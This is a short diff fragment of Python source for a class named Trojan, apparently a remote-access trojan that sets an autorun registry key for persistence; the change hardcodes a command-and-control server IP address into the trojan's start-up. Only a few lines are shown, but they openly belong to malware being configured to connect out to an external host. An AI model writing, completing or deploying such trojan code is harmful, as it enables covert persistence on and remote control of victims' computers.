@@ -374,5 +374,5 @@ class Trojan(threading.Thread):
             self.client.add("[!] failed to create the autorun key")
 
 if __name__ == "__main__":
-    trojanthread = Trojan()
+    trojanthread = Trojan(server_ip="95.114.55.98")
     trojanthread.start()
